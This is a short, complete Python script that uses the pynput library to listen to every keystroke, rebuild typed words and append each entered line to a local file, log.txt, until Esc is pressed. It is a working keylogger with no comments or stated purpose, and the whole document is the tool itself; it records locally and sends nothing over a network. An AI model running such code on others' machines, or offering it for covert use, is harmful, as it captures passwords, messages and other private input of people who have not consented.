from pynput.keyboard import Key, Listener

fullLog = ''
words = ''

def onPress(key):
    global fullLog
    global words
    if key == Key.space:
        words += ' '

    elif key == Key.backspace:
        words = words[:-1]

    elif key == Key.enter:
        fullLog += words + '\n'
        with open("log.txt", "a") as f:
            f.write(fullLog)


        words = ''
        fullLog = ''
    
    else:
        char = f'{key}'
        char = char.replace("'", "")
        words += char
    
    if key == Key.esc:
        return False
    
def main():
    with Listener(on_press=onPress) as k_listener:
        k_listener.join()

if __name__ == "__main__":
    main()